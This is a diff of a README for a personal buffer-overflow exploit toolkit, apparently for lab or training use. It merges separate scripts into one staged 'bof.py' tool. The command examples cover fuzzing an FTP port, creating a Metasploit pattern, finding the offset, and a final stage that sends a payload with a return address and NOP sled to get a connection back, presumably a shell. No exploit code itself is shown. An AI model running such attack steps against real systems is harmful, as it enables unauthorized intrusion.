@@ -3,28 +3,30 @@ just some general purpose tools to help myself when detecting and performing buf
 
 Ignore the code it's just PoC right now.
 
-## Throw 100 bytes of data at the socket until it crashes, examine crash point
+https://youtu.be/ljxVBLHIyWk
+
+## Throw 200 bytes of data at the socket until it crashes, examine crash point -- stage 1
 ```
-➜  exploitdev ./evilFuzzer.py 192.168.1.236 21 100
+➜  ./bof.py --ip 192.168.1.236 --port 21 --bytes 200 --stage 1
 ```
 
-## Use Metasploit-Framework's pattern_create tool automagically.
+## Use Metasploit-Framework's pattern_create tool automagically. -- stage 2
 ```
-➜  exploitdev ./evilPattern.py 192.168.1.236 21 2400
-```
-
-## Helper function to return the exact offset via pattern_offset from the instruction pointer
-```
-➜  exploitdev ./getOffset.py address
+➜  ./bof.py --ip 192.168.1.236 --port 21 --bytes 2400 --stage 2
 ```
 
-## Hunt your bad characters
+## Helper function to return the exact offset via pattern_offset from the instruction pointer -- stage 3
+```
+➜  ./bof.py --address 7043396F --stage 3
+```
+
+## Hunt your bad characters -- stage 4
 TODO
 
-## Blast your socket and get a connection back
+## Blast your socket and get a connection back -- stage 5
 
 ```bash
-➜  exploitdev ./evilSocket.py 192.168.1.236 21 2008 77F1E871 15
+➜  ./bof.py --ip 192.168.1.236 --port 21 --bytes 2008 --address 77F1E871 --nops 15 --stage 5
 ```
 
 ## End Result
